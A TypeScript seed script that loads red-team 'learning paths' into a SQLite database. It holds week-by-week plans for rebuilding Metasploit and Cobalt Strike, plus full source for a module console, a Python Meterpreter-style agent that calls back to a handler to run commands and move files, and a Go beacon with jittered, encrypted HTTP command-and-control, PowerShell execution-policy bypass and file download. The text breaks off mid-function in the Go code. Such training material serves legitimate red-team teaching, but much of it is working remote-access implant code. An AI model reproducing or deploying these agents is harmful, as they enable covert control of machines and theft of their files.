#!/usr/bin/env npx tsx
/**
 * Seed: Metasploit, Cobalt Strike, XSStrike, Certify, Hashcat GPU
 * Final batch of red team tools with detailed schedules
 */

import Database from 'better-sqlite3';
import { join } from 'path';

const db = new Database(join(process.cwd(), 'data', 'quest-log.db'));
const now = Date.now();

const insertPath = db.prepare(`
	INSERT INTO paths (name, description, color, language, difficulty, estimated_weeks, skills, schedule, created_at)
	VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
`);

const insertModule = db.prepare(`
	INSERT INTO modules (path_id, name, description, order_index, created_at)
	VALUES (?, ?, ?, ?, ?)
`);

const insertTask = db.prepare(`
	INSERT INTO tasks (module_id, title, description, details, order_index, created_at)
	VALUES (?, ?, ?, ?, ?, ?)
`);

// ============================================================================
// METASPLOIT FRAMEWORK
// ============================================================================
const metasploitSchedule = `## 8-Week Schedule

### Week 1: Framework Core
| Day | Focus | Tasks |
|-----|-------|-------|
| Day 1 | Architecture | Design plugin system, module loading |
| Day 2 | Database | PostgreSQL/SQLite for session tracking |
| Day 3 | Console | Build interactive console with commands |
| Day 4 | Workspaces | Multi-project workspace support |
| Day 5 | Logging | Event logging and history |
| Weekend | Testing | Core framework tests |

### Week 2: Exploit Modules
| Day | Focus | Tasks |
|-----|-------|-------|
| Day 1 | Module Structure | Base exploit class, options, targets |
| Day 2 | Payload Handling | Payload generation and encoding |
| Day 3 | Check Methods | Vulnerability verification |
| Day 4 | Exploit Execution | Remote code execution flow |
| Day 5 | Buffer Overflows | Stack-based exploit module |
| Weekend | Integration | Module loading and execution |

### Week 3: Payloads
| Day | Focus | Tasks |
|-----|-------|-------|
| Day 1 | Payload Types | Singles, stagers, stages |
| Day 2 | Meterpreter Core | Basic Meterpreter shell |
| Day 3 | Reverse Shells | TCP/HTTP/HTTPS reverse shells |
| Day 4 | Bind Shells | Bind TCP payloads |
| Day 5 | Staged Payloads | Multi-stage delivery |
| Weekend | Cross-platform | Windows/Linux payloads |

### Week 4: Post-Exploitation
| Day | Focus | Tasks |
|-----|-------|-------|
| Day 1 | Session Management | Track active sessions |
| Day 2 | File Operations | Upload, download, search |
| Day 3 | Process Management | Migrate, kill, list processes |
| Day 4 | Privilege Escalation | getsystem-style modules |
| Day 5 | Credential Harvesting | hashdump, mimikatz integration |
| Weekend | Persistence | Registry, services, scheduled tasks |

### Week 5: Auxiliary Modules
| Day | Focus | Tasks |
|-----|-------|-------|
| Day 1 | Scanner Base | Port scanning framework |
| Day 2 | Service Scanners | SMB, SSH, HTTP scanners |
| Day 3 | Fuzzers | Protocol fuzzing modules |
| Day 4 | Spoofers | ARP, DNS spoofers |
| Day 5 | DoS Modules | Resource exhaustion tests |
| Weekend | Gatherers | Information gathering modules |

### Week 6: Evasion
| Day | Focus | Tasks |
|-----|-------|-------|
| Day 1 | Encoders | XOR, shikata_ga_nai style |
| Day 2 | Crypters | AES payload encryption |
| Day 3 | Packers | Custom PE packing |
| Day 4 | Obfuscation | Code obfuscation |
| Day 5 | Anti-Sandbox | VM/Sandbox detection |
| Weekend | Testing | AV evasion testing |

### Week 7: Handlers & Listeners
| Day | Focus | Tasks |
|-----|-------|-------|
| Day 1 | Multi/Handler | Universal payload handler |
| Day 2 | HTTP/S Handler | Web-based C2 |
| Day 3 | DNS Handler | DNS tunneling |
| Day 4 | SMB Handler | Named pipe handler |
| Day 5 | Pivoting | Route through sessions |
| Weekend | Automation | Resource scripts |

### Week 8: Web Interface & Polish
| Day | Focus | Tasks |
|-----|-------|-------|
| Day 1 | REST API | JSON API for automation |
| Day 2 | Web UI | React/Vue dashboard |
| Day 3 | Reporting | HTML/PDF reports |
| Day 4 | Collaboration | Multi-user support |
| Day 5 | Documentation | User guide, API docs |
| Weekend | Release | Package and distribute |

### Daily Commitment
- **Minimum**: 3-4 hours focused coding
- **Ideal**: 5-6 hours with testing`;

const metasploitPath = insertPath.run(
	'Reimplement: Metasploit Framework',
	'Build a complete exploitation framework like Metasploit. Exploit modules, payloads, encoders, post-exploitation, Meterpreter-style sessions, and handler infrastructure.',
	'red',
	'Ruby+Python+C',
	'expert',
	8,
	'Exploitation, payloads, shellcode, post-exploitation, C2, evasion',
	metasploitSchedule,
	now
);

const msfMod1 = insertModule.run(metasploitPath.lastInsertRowid, 'Framework Architecture', 'Core framework design', 0, now);

insertTask.run(msfMod1.lastInsertRowid, 'Build Module Loading System', 'Create a plugin architecture for dynamically discovering, loading, and managing exploit, auxiliary, and post-exploitation modules with metadata parsing, dependency resolution, and runtime configuration', `## Module Loading System

### Python Implementation

\`\`\`python
#!/usr/bin/env python3
"""
Metasploit-style Module Framework
Dynamic module loading and execution
"""

import os
import sys
import importlib.util
from abc import ABC, abstractmethod
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Any, Type
from enum import Enum
import inspect


class ModuleType(Enum):
    EXPLOIT = "exploit"
    AUXILIARY = "auxiliary"
    POST = "post"
    PAYLOAD = "payload"
    ENCODER = "encoder"
    NOP = "nop"


class Rank(Enum):
    MANUAL = 0
    LOW = 100
    AVERAGE = 200
    NORMAL = 300
    GOOD = 400
    GREAT = 500
    EXCELLENT = 600


@dataclass
class ModuleOption:
    name: str
    type: str  # string, integer, address, port, path, bool
    required: bool
    default: Any
    description: str
    value: Any = None

    def validate(self) -> bool:
        if self.required and self.value is None:
            return False
        return True


@dataclass
class ModuleTarget:
    name: str
    opts: Dict[str, Any] = field(default_factory=dict)


@dataclass
class ModuleInfo:
    name: str
    description: str
    author: List[str]
    license: str
    references: List[tuple] = field(default_factory=list)
    platform: List[str] = field(default_factory=list)
    arch: List[str] = field(default_factory=list)
    rank: Rank = Rank.NORMAL


class BaseModule(ABC):
    """Base class for all modules"""

    def __init__(self):
        self.options: Dict[str, ModuleOption] = {}
        self.targets: List[ModuleTarget] = []
        self._target_index = 0
        self._datastore: Dict[str, Any] = {}

    @property
    @abstractmethod
    def info(self) -> ModuleInfo:
        pass

    @property
    @abstractmethod
    def module_type(self) -> ModuleType:
        pass

    def register_options(self, options: List[ModuleOption]):
        for opt in options:
            self.options[opt.name] = opt

    def register_targets(self, targets: List[ModuleTarget]):
        self.targets = targets

    def set_option(self, name: str, value: Any):
        if name in self.options:
            self.options[name].value = value
        self._datastore[name] = value

    def get_option(self, name: str) -> Any:
        if name in self.options:
            return self.options[name].value
        return self._datastore.get(name)

    @property
    def target(self) -> Optional[ModuleTarget]:
        if self.targets and 0 <= self._target_index < len(self.targets):
            return self.targets[self._target_index]
        return None

    def set_target(self, index: int):
        self._target_index = index

    def validate_options(self) -> List[str]:
        errors = []
        for name, opt in self.options.items():
            if not opt.validate():
                errors.append(f"Required option '{name}' is not set")
        return errors

    def print_status(self, msg: str):
        print(f"[*] {msg}")

    def print_good(self, msg: str):
        print(f"[+] {msg}")

    def print_error(self, msg: str):
        print(f"[-] {msg}")

    def print_warning(self, msg: str):
        print(f"[!] {msg}")


class Exploit(BaseModule):
    """Base class for exploit modules"""

    @property
    def module_type(self) -> ModuleType:
        return ModuleType.EXPLOIT

    @abstractmethod
    def check(self) -> bool:
        """Check if target is vulnerable"""
        pass

    @abstractmethod
    def exploit(self) -> bool:
        """Execute the exploit"""
        pass

    def run(self) -> bool:
        errors = self.validate_options()
        if errors:
            for e in errors:
                self.print_error(e)
            return False

        return self.exploit()


class Auxiliary(BaseModule):
    """Base class for auxiliary modules"""

    @property
    def module_type(self) -> ModuleType:
        return ModuleType.AUXILIARY

    @abstractmethod
    def run(self) -> bool:
        pass


class Post(BaseModule):
    """Base class for post-exploitation modules"""

    @property
    def module_type(self) -> ModuleType:
        return ModuleType.POST

    def __init__(self):
        super().__init__()
        self.session = None

    @abstractmethod
    def run(self) -> bool:
        pass


class Payload(BaseModule):
    """Base class for payloads"""

    @property
    def module_type(self) -> ModuleType:
        return ModuleType.PAYLOAD

    @abstractmethod
    def generate(self) -> bytes:
        """Generate payload bytes"""
        pass

    @property
    def size(self) -> int:
        return len(self.generate())


class ModuleManager:
    """Manages module discovery and loading"""

    def __init__(self, module_paths: List[str] = None):
        self.module_paths = module_paths or ['./modules']
        self.modules: Dict[str, Type[BaseModule]] = {}
        self._loaded: Dict[str, BaseModule] = {}

    def load_modules(self):
        """Discover and load all modules"""
        for base_path in self.module_paths:
            if not os.path.exists(base_path):
                continue

            for root, dirs, files in os.walk(base_path):
                for file in files:
                    if file.endswith('.py') and not file.startswith('_'):
                        module_path = os.path.join(root, file)
                        self._load_module_file(module_path, base_path)

        print(f"[*] Loaded {len(self.modules)} modules")

    def _load_module_file(self, path: str, base_path: str):
        """Load a single module file"""
        try:
            # Calculate module name from path
            rel_path = os.path.relpath(path, base_path)
            module_name = rel_path.replace('/', '.').replace('\\\\', '.')[:-3]

            spec = importlib.util.spec_from_file_location(module_name, path)
            module = importlib.util.module_from_spec(spec)
            spec.loader.exec_module(module)

            # Find module classes
            for name, obj in inspect.getmembers(module, inspect.isclass):
                if issubclass(obj, BaseModule) and obj not in [
                    BaseModule, Exploit, Auxiliary, Post, Payload
                ]:
                    full_name = f"{module_name}/{name}".lower()
                    self.modules[full_name] = obj

        except Exception as e:
            print(f"[-] Error loading {path}: {e}")

    def use(self, module_name: str) -> Optional[BaseModule]:
        """Load and return a module instance"""
        # Find matching module
        matches = [k for k in self.modules if module_name.lower() in k.lower()]

        if not matches:
            print(f"[-] Module not found: {module_name}")
            return None

        if len(matches) > 1:
            print(f"[!] Multiple matches found:")
            for m in matches:
                print(f"    {m}")
            return None

        module_key = matches[0]

        if module_key not in self._loaded:
            self._loaded[module_key] = self.modules[module_key]()

        return self._loaded[module_key]

    def search(self, query: str) -> List[str]:
        """Search for modules"""
        return [k for k in self.modules if query.lower() in k.lower()]


# Example exploit module
class EternalBlueExploit(Exploit):
    """MS17-010 EternalBlue SMB RCE"""

    @property
    def info(self) -> ModuleInfo:
        return ModuleInfo(
            name="MS17-010 EternalBlue SMB Remote Code Execution",
            description="Exploits a vulnerability in SMBv1",
            author=["Author1", "Author2"],
            license="BSD",
            references=[
                ("CVE", "2017-0144"),
                ("MSB", "MS17-010"),
                ("URL", "https://example.com"),
            ],
            platform=["windows"],
            arch=["x64", "x86"],
            rank=Rank.GREAT
        )

    def __init__(self):
        super().__init__()

        self.register_options([
            ModuleOption("RHOSTS", "address", True, None, "Target address"),
            ModuleOption("RPORT", "port", True, 445, "Target port"),
            ModuleOption("SMBUser", "string", False, "", "SMB Username"),
            ModuleOption("SMBPass", "string", False, "", "SMB Password"),
        ])

        self.register_targets([
            ModuleTarget("Windows 7 SP1 x64", {"offset": 0x350}),
            ModuleTarget("Windows Server 2008 R2 x64", {"offset": 0x358}),
        ])

    def check(self) -> bool:
        self.print_status(f"Checking {self.get_option('RHOSTS')}...")
        # Would implement actual check
        return True

    def exploit(self) -> bool:
        self.print_status(f"Exploiting {self.get_option('RHOSTS')}...")
        self.print_status(f"Using target: {self.target.name}")

        # Exploit implementation would go here
        self.print_good("Exploit completed!")
        return True


class Console:
    """Interactive console for the framework"""

    def __init__(self):
        self.manager = ModuleManager()
        self.current_module: Optional[BaseModule] = None

    def start(self):
        self.manager.load_modules()

        print("\\n" + "="*50)
        print("  Metasploit-style Framework")
        print("="*50 + "\\n")

        while True:
            try:
                prompt = "msf6"
                if self.current_module:
                    mod_type = self.current_module.module_type.value
                    mod_name = self.current_module.info.name[:30]
                    prompt = f"msf6 {mod_type}({mod_name})"

                cmd = input(f"{prompt} > ").strip()
                self.handle_command(cmd)

            except KeyboardInterrupt:
                print()
                continue
            except EOFError:
                break

    def handle_command(self, cmd: str):
        if not cmd:
            return

        parts = cmd.split()
        command = parts[0].lower()
        args = parts[1:]

        commands = {
            'use': self.cmd_use,
            'search': self.cmd_search,
            'info': self.cmd_info,
            'show': self.cmd_show,
            'set': self.cmd_set,
            'run': self.cmd_run,
            'exploit': self.cmd_run,
            'check': self.cmd_check,
            'back': self.cmd_back,
            'exit': self.cmd_exit,
            'help': self.cmd_help,
        }

        if command in commands:
            commands[command](args)
        else:
            print(f"[-] Unknown command: {command}")

    def cmd_use(self, args):
        if not args:
            print("Usage: use <module>")
            return
        self.current_module = self.manager.use(args[0])

    def cmd_search(self, args):
        query = ' '.join(args) if args else ''
        results = self.manager.search(query)
        for r in results:
            print(f"  {r}")

    def cmd_info(self, args):
        if not self.current_module:
            print("[-] No module selected")
            return

        info = self.current_module.info
        print(f"\\n  Name: {info.name}")
        print(f"  Description: {info.description}")
        print(f"  Authors: {', '.join(info.author)}")
        print(f"  Rank: {info.rank.name}")
        print()

    def cmd_show(self, args):
        if not args:
            print("Usage: show [options|targets|info]")
            return

        if args[0] == 'options':
            self._show_options()
        elif args[0] == 'targets':
            self._show_targets()

    def _show_options(self):
        if not self.current_module:
            return

        print("\\nModule options:")
        print(f"{'Name':<15} {'Current':<15} {'Required':<10} {'Description'}")
        print("-" * 70)

        for name, opt in self.current_module.options.items():
            value = opt.value if opt.value is not None else opt.default
            value_str = str(value) if value else ""
            req = "yes" if opt.required else "no"
            print(f"{name:<15} {value_str:<15} {req:<10} {opt.description}")

    def _show_targets(self):
        if not self.current_module:
            return

        print("\\nExploit targets:")
        for i, target in enumerate(self.current_module.targets):
            marker = "=>" if i == self.current_module._target_index else "  "
            print(f"  {marker} {i}  {target.name}")

    def cmd_set(self, args):
        if len(args) < 2:
            print("Usage: set <option> <value>")
            return

        if not self.current_module:
            print("[-] No module selected")
            return

        name = args[0].upper()
        value = ' '.join(args[1:])

        if name == "TARGET":
            self.current_module.set_target(int(value))
        else:
            self.current_module.set_option(name, value)

        print(f"{name} => {value}")

    def cmd_run(self, args):
        if not self.current_module:
            print("[-] No module selected")
            return

        self.current_module.run()

    def cmd_check(self, args):
        if not self.current_module:
            print("[-] No module selected")
            return

        if hasattr(self.current_module, 'check'):
            self.current_module.check()

    def cmd_back(self, args):
        self.current_module = None

    def cmd_exit(self, args):
        sys.exit(0)

    def cmd_help(self, args):
        print("""
Core Commands
=============
  use <module>      Select a module
  search <query>    Search for modules
  info              Show module information
  show options      Show module options
  show targets      Show exploit targets
  set <opt> <val>   Set an option
  run / exploit     Run the module
  check             Check if target is vulnerable
  back              Deselect module
  exit              Exit the console
        """)


if __name__ == '__main__':
    console = Console()
    console.start()
\`\`\`
`, 0, now);

const msfMod2 = insertModule.run(metasploitPath.lastInsertRowid, 'Payload Generation', 'Shellcode and payload creation', 1, now);

insertTask.run(msfMod2.lastInsertRowid, 'Build Meterpreter Shell', 'Create a post-exploitation agent with in-memory execution, encrypted C2 communications, extensible command system, file system operations, privilege escalation modules, and pivoting capabilities through session routing', `## Meterpreter Implementation

### Core Meterpreter Agent

\`\`\`python
#!/usr/bin/env python3
"""
Meterpreter-style Post-Exploitation Agent
"""

import socket
import struct
import os
import sys
import subprocess
import threading
import base64
import json
from typing import Dict, Callable, Any, Optional
from dataclasses import dataclass
import platform


@dataclass
class Command:
    id: int
    name: str
    args: Dict[str, Any]


@dataclass
class Response:
    id: int
    success: bool
    data: Any
    error: Optional[str] = None


class MeterpreterClient:
    """Meterpreter-style client agent"""

    PACKET_HEADER = b'MTRP'
    HEADER_SIZE = 12  # Magic(4) + Length(4) + Type(4)

    def __init__(self, host: str, port: int):
        self.host = host
        self.port = port
        self.sock: Optional[socket.socket] = None
        self.running = False
        self.commands: Dict[str, Callable] = {}
        self._register_commands()

    def _register_commands(self):
        """Register available commands"""
        self.commands = {
            'sysinfo': self.cmd_sysinfo,
            'getuid': self.cmd_getuid,
            'getpid': self.cmd_getpid,
            'pwd': self.cmd_pwd,
            'cd': self.cmd_cd,
            'ls': self.cmd_ls,
            'cat': self.cmd_cat,
            'upload': self.cmd_upload,
            'download': self.cmd_download,
            'execute': self.cmd_execute,
            'shell': self.cmd_shell,
            'ps': self.cmd_ps,
            'kill': self.cmd_kill,
            'migrate': self.cmd_migrate,
            'hashdump': self.cmd_hashdump,
            'screenshot': self.cmd_screenshot,
            'keylog_start': self.cmd_keylog_start,
            'keylog_stop': self.cmd_keylog_stop,
            'portfwd': self.cmd_portfwd,
            'exit': self.cmd_exit,
        }

    def connect(self) -> bool:
        """Connect to handler"""
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.connect((self.host, self.port))
            self.running = True
            return True
        except Exception as e:
            return False

    def run(self):
        """Main command loop"""
        if not self.connect():
            return

        # Send initial sysinfo
        self._send_response(Response(0, True, self.cmd_sysinfo({})))

        while self.running:
            try:
                cmd = self._receive_command()
                if not cmd:
                    continue

                response = self._execute_command(cmd)
                self._send_response(response)

            except Exception as e:
                self.running = False

    def _receive_command(self) -> Optional[Command]:
        """Receive command from handler"""
        try:
            # Read header
            header = self.sock.recv(self.HEADER_SIZE)
            if len(header) < self.HEADER_SIZE:
                return None

            magic = header[:4]
            if magic != self.PACKET_HEADER:
                return None

            length = struct.unpack('>I', header[4:8])[0]
            cmd_type = struct.unpack('>I', header[8:12])[0]

            # Read payload
            data = b''
            while len(data) < length:
                chunk = self.sock.recv(length - len(data))
                if not chunk:
                    return None
                data += chunk

            # Parse command
            cmd_data = json.loads(data.decode())
            return Command(
                id=cmd_data.get('id', 0),
                name=cmd_data.get('name', ''),
                args=cmd_data.get('args', {})
            )

        except:
            return None

    def _send_response(self, response: Response):
        """Send response to handler"""
        try:
            data = json.dumps({
                'id': response.id,
                'success': response.success,
                'data': response.data,
                'error': response.error
            }).encode()

            header = self.PACKET_HEADER
            header += struct.pack('>I', len(data))
            header += struct.pack('>I', 1)  # Response type

            self.sock.sendall(header + data)

        except:
            pass

    def _execute_command(self, cmd: Command) -> Response:
        """Execute a command"""
        if cmd.name not in self.commands:
            return Response(cmd.id, False, None, f"Unknown command: {cmd.name}")

        try:
            result = self.commands[cmd.name](cmd.args)
            return Response(cmd.id, True, result)
        except Exception as e:
            return Response(cmd.id, False, None, str(e))

    # Command implementations

    def cmd_sysinfo(self, args: Dict) -> Dict:
        """Get system information"""
        return {
            'computer': platform.node(),
            'os': platform.system(),
            'os_version': platform.version(),
            'architecture': platform.machine(),
            'user': os.getenv('USER') or os.getenv('USERNAME'),
            'pid': os.getpid(),
            'cwd': os.getcwd(),
        }

    def cmd_getuid(self, args: Dict) -> str:
        """Get current user"""
        return os.getenv('USER') or os.getenv('USERNAME') or str(os.getuid())

    def cmd_getpid(self, args: Dict) -> int:
        """Get current process ID"""
        return os.getpid()

    def cmd_pwd(self, args: Dict) -> str:
        """Get current directory"""
        return os.getcwd()

    def cmd_cd(self, args: Dict) -> str:
        """Change directory"""
        path = args.get('path', '/')
        os.chdir(path)
        return os.getcwd()

    def cmd_ls(self, args: Dict) -> list:
        """List directory contents"""
        path = args.get('path', '.')
        entries = []

        for entry in os.listdir(path):
            full_path = os.path.join(path, entry)
            stat = os.stat(full_path)
            entries.append({
                'name': entry,
                'size': stat.st_size,
                'mode': oct(stat.st_mode),
                'is_dir': os.path.isdir(full_path),
            })

        return entries

    def cmd_cat(self, args: Dict) -> str:
        """Read file contents"""
        path = args.get('path')
        with open(path, 'r') as f:
            return f.read()

    def cmd_upload(self, args: Dict) -> bool:
        """Upload file to target"""
        path = args.get('path')
        data = base64.b64decode(args.get('data', ''))

        with open(path, 'wb') as f:
            f.write(data)

        return True

    def cmd_download(self, args: Dict) -> str:
        """Download file from target"""
        path = args.get('path')

        with open(path, 'rb') as f:
            data = f.read()

        return base64.b64encode(data).decode()

    def cmd_execute(self, args: Dict) -> Dict:
        """Execute command"""
        cmd = args.get('cmd')
        hidden = args.get('hidden', True)

        result = subprocess.run(
            cmd,
            shell=True,
            capture_output=True,
            text=True
        )

        return {
            'stdout': result.stdout,
            'stderr': result.stderr,
            'returncode': result.returncode
        }

    def cmd_shell(self, args: Dict) -> str:
        """Interactive shell command"""
        cmd = args.get('cmd')
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        return result.stdout + result.stderr

    def cmd_ps(self, args: Dict) -> list:
        """List processes"""
        processes = []

        if platform.system() == 'Windows':
            result = subprocess.run(
                'tasklist /FO CSV',
                shell=True, capture_output=True, text=True
            )
            # Parse CSV output
        else:
            for pid in os.listdir('/proc'):
                if pid.isdigit():
                    try:
                        with open(f'/proc/{pid}/comm', 'r') as f:
                            name = f.read().strip()
                        with open(f'/proc/{pid}/status', 'r') as f:
                            status = f.read()
                            uid = None
                            for line in status.split('\\n'):
                                if line.startswith('Uid:'):
                                    uid = line.split()[1]
                                    break

                        processes.append({
                            'pid': int(pid),
                            'name': name,
                            'uid': uid
                        })
                    except:
                        continue

        return processes

    def cmd_kill(self, args: Dict) -> bool:
        """Kill process"""
        pid = args.get('pid')
        os.kill(pid, 9)
        return True

    def cmd_migrate(self, args: Dict) -> bool:
        """Migrate to another process (placeholder)"""
        pid = args.get('pid')
        # Would implement process injection
        return False

    def cmd_hashdump(self, args: Dict) -> list:
        """Dump password hashes (placeholder)"""
        # Would implement SAM/shadow dumping
        return []

    def cmd_screenshot(self, args: Dict) -> str:
        """Take screenshot (placeholder)"""
        # Would implement screenshot capture
        return ""

    def cmd_keylog_start(self, args: Dict) -> bool:
        """Start keylogger (placeholder)"""
        return False

    def cmd_keylog_stop(self, args: Dict) -> str:
        """Stop keylogger and get buffer (placeholder)"""
        return ""

    def cmd_portfwd(self, args: Dict) -> bool:
        """Port forwarding (placeholder)"""
        return False

    def cmd_exit(self, args: Dict) -> bool:
        """Exit agent"""
        self.running = False
        return True


class MeterpreterHandler:
    """Handler for Meterpreter sessions"""

    def __init__(self, host: str = '0.0.0.0', port: int = 4444):
        self.host = host
        self.port = port
        self.sessions: Dict[int, socket.socket] = {}
        self.session_counter = 0

    def start(self):
        """Start handler"""
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((self.host, self.port))
        server.listen(5)

        print(f"[*] Handler listening on {self.host}:{self.port}")

        while True:
            client, addr = server.accept()
            self.session_counter += 1
            self.sessions[self.session_counter] = client
            print(f"[+] Session {self.session_counter} opened from {addr}")


if __name__ == '__main__':
    if len(sys.argv) > 1 and sys.argv[1] == 'handler':
        handler = MeterpreterHandler()
        handler.start()
    else:
        client = MeterpreterClient('127.0.0.1', 4444)
        client.run()
\`\`\`
`, 0, now);

// ============================================================================
// COBALT STRIKE
// ============================================================================
const cobaltSchedule = `## 10-Week Schedule

### Week 1-2: Team Server
| Day | Focus | Tasks |
|-----|-------|-------|
| Week 1 | Server Core | Multi-operator support, authentication |
| Week 2 | Database | Session tracking, logging, loot storage |

### Week 3-4: Beacon Agent
| Day | Focus | Tasks |
|-----|-------|-------|
| Week 3 | Beacon Core | Sleep, jitter, C2 communication |
| Week 4 | Commands | File ops, execution, post-ex |

### Week 5-6: C2 Profiles
| Day | Focus | Tasks |
|-----|-------|-------|
| Week 5 | Malleable C2 | Custom HTTP profiles |
| Week 6 | HTTPS/DNS | Alternative C2 channels |

### Week 7-8: Lateral Movement
| Day | Focus | Tasks |
|-----|-------|-------|
| Week 7 | SMB Beacon | Peer-to-peer beacons |
| Week 8 | Jump/Remote-Exec | psexec, wmi, winrm |

### Week 9-10: Evasion & GUI
| Day | Focus | Tasks |
|-----|-------|-------|
| Week 9 | Evasion | Sleep mask, syscalls, unhooking |
| Week 10 | GUI | Operator interface |

### Daily Commitment
- **Minimum**: 4 hours
- **Ideal**: 6 hours`;

const cobaltPath = insertPath.run(
	'Reimplement: Cobalt Strike C2',
	'Build an advanced C2 framework like Cobalt Strike. Team server, Beacon agent, malleable C2 profiles, lateral movement, and evasion techniques.',
	'purple',
	'Go+C+Python',
	'expert',
	10,
	'C2, beacons, malleable profiles, lateral movement, evasion, team operations',
	cobaltSchedule,
	now
);

const csMod1 = insertModule.run(cobaltPath.lastInsertRowid, 'Beacon Agent', 'Advanced implant development', 0, now);

insertTask.run(csMod1.lastInsertRowid, 'Build Beacon Core', 'Implement the core beacon loop with configurable sleep intervals, randomized jitter for traffic evasion, malleable C2 profile support for HTTP request customization, and encrypted task retrieval and result submission', `## Beacon Implementation

### Go Beacon Agent

\`\`\`go
package main

import (
    "bytes"
    "crypto/aes"
    "crypto/cipher"
    "crypto/rand"
    "encoding/base64"
    "encoding/json"
    "fmt"
    "io"
    "io/ioutil"
    "math/big"
    mrand "math/rand"
    "net/http"
    "os"
    "os/exec"
    "runtime"
    "time"
)

// BeaconConfig holds beacon configuration
type BeaconConfig struct {
    TeamServer  string
    UserAgent   string
    SleepTime   int // seconds
    Jitter      int // percentage
    AESKey      []byte
    BeaconID    string
}

// Task represents a task from team server
type Task struct {
    ID      string \`json:"id"\`
    Command string \`json:"command"\`
    Args    []string \`json:"args"\`
}

// TaskResult represents task execution result
type TaskResult struct {
    TaskID  string \`json:"task_id"\`
    Success bool   \`json:"success"\`
    Output  string \`json:"output"\`
    Error   string \`json:"error,omitempty"\`
}

// Beacon is the main beacon struct
type Beacon struct {
    config  *BeaconConfig
    client  *http.Client
    running bool
}

func NewBeacon(config *BeaconConfig) *Beacon {
    // Generate random beacon ID
    id := make([]byte, 8)
    rand.Read(id)
    config.BeaconID = base64.RawURLEncoding.EncodeToString(id)

    return &Beacon{
        config: config,
        client: &http.Client{
            Timeout: 30 * time.Second,
        },
        running: true,
    }
}

func (b *Beacon) Run() {
    // Initial check-in
    b.checkin()

    for b.running {
        // Sleep with jitter
        b.sleep()

        // Get tasks
        tasks := b.getTasks()

        // Execute tasks
        for _, task := range tasks {
            result := b.executeTask(task)
            b.sendResult(result)
        }
    }
}

func (b *Beacon) sleep() {
    sleepTime := b.config.SleepTime

    // Apply jitter
    if b.config.Jitter > 0 {
        jitterRange := sleepTime * b.config.Jitter / 100
        n, _ := rand.Int(rand.Reader, big.NewInt(int64(jitterRange*2)))
        jitter := int(n.Int64()) - jitterRange
        sleepTime += jitter
    }

    time.Sleep(time.Duration(sleepTime) * time.Second)
}

func (b *Beacon) checkin() {
    // Send initial beacon info
    info := map[string]interface{}{
        "id":       b.config.BeaconID,
        "hostname": getHostname(),
        "username": getUsername(),
        "os":       runtime.GOOS,
        "arch":     runtime.GOARCH,
        "pid":      os.Getpid(),
        "elevated": isElevated(),
    }

    data, _ := json.Marshal(info)
    b.post("/beacon/checkin", data)
}

func (b *Beacon) getTasks() []Task {
    resp, err := b.get("/beacon/tasks?id=" + b.config.BeaconID)
    if err != nil {
        return nil
    }

    var tasks []Task
    json.Unmarshal(resp, &tasks)
    return tasks
}

func (b *Beacon) sendResult(result TaskResult) {
    data, _ := json.Marshal(result)
    b.post("/beacon/results", data)
}

func (b *Beacon) executeTask(task Task) TaskResult {
    result := TaskResult{
        TaskID:  task.ID,
        Success: true,
    }

    switch task.Command {
    case "shell":
        output, err := b.cmdShell(task.Args)
        result.Output = output
        if err != nil {
            result.Success = false
            result.Error = err.Error()
        }

    case "powershell":
        output, err := b.cmdPowershell(task.Args)
        result.Output = output
        if err != nil {
            result.Success = false
            result.Error = err.Error()
        }

    case "execute-assembly":
        output, err := b.cmdExecuteAssembly(task.Args)
        result.Output = output
        if err != nil {
            result.Success = false
            result.Error = err.Error()
        }

    case "upload":
        err := b.cmdUpload(task.Args)
        if err != nil {
            result.Success = false
            result.Error = err.Error()
        }

    case "download":
        data, err := b.cmdDownload(task.Args)
        result.Output = data
        if err != nil {
            result.Success = false
            result.Error = err.Error()
        }

    case "sleep":
        b.cmdSleep(task.Args)

    case "exit":
        b.running = false

    default:
        result.Success = false
        result.Error = "Unknown command"
    }

    return result
}

// Commands

func (b *Beacon) cmdShell(args []string) (string, error) {
    if len(args) == 0 {
        return "", fmt.Errorf("no command provided")
    }

    var cmd *exec.Cmd
    if runtime.GOOS == "windows" {
        cmd = exec.Command("cmd.exe", "/c", args[0])
    } else {
        cmd = exec.Command("/bin/sh", "-c", args[0])
    }

    output, err := cmd.CombinedOutput()
    return string(output), err
}

func (b *Beacon) cmdPowershell(args []string) (string, error) {
    if len(args) == 0 {
        return "", fmt.Errorf("no command provided")
    }

    cmd := exec.Command("powershell.exe", "-NoProfile", "-NonInteractive",
        "-ExecutionPolicy", "Bypass", "-Command", args[0])
    output, err := cmd.CombinedOutput()
    return string(output), err
}

func (b *Beacon) cmdExecuteAssembly(args []string) (string, error) {
    // In-memory .NET assembly execution
    // Would use CLR hosting
    return "", fmt.Errorf("not implemented")
}

func (b *Beacon) cmdUpload(args []string) error {
    if len(args) < 2 {
        return fmt.Errorf("usage: upload <remote_path> <base64_data>")
    }

    data, err := base64.StdEncoding.DecodeString(args[1])
    if err != nil {
        return err
    }

    return ioutil.WriteFile(args[0], data, 0644)
}

func (b *Beacon) cmdDownload(args []string) (string, error) {
    if len(args) == 0 {
        return "", fmt.Errorf("no file specified")
    }

    data, err := ioutil.ReadFile(args[0])
    if err != nil {
        return "", err
    }

    return base64.StdEncoding.EncodeToString(data), nil
}

func (b *Beacon) cmdSleep(args []string) {
    if len(args) > 0 {
        var sleep, jitter int
        fmt.Sscanf(args[0], "%d %d", &sleep, &jitter)
        b.config.SleepTime = sleep
        if jitter > 0 {
            b.config.Jitter = jitter
        }
    }
}

// HTTP Communication

func (b *Beacon) get(path string) ([]byte, error) {
    url := b.config.TeamServer + path

    req, _ := http.NewRequest("GET", url, nil)
    req.Header.Set("User-Agent", b.config.UserAgent)

    resp, err := b.client.Do(req)
    if err != nil {
        return nil, err
    }
    defer resp.Body.Close()

    body, _ := ioutil.ReadAll(resp.Body)
    return b.decrypt(body)
}

func (b *Beacon) post(path string, data []byte) ([]byte, error) {
    url := b.config.TeamServer + path

    encrypted := b.encrypt(data)
    req, _ := http.NewRequest("POST", url, bytes.NewReader(encrypted))
    req.Header.Set("User-Agent", b.config.UserAgent)
    req.Header.Set("Content-Type", "application/octet-stream")

    resp, err := b.client.Do(req)
    if err != nil {
        return nil, err
    }
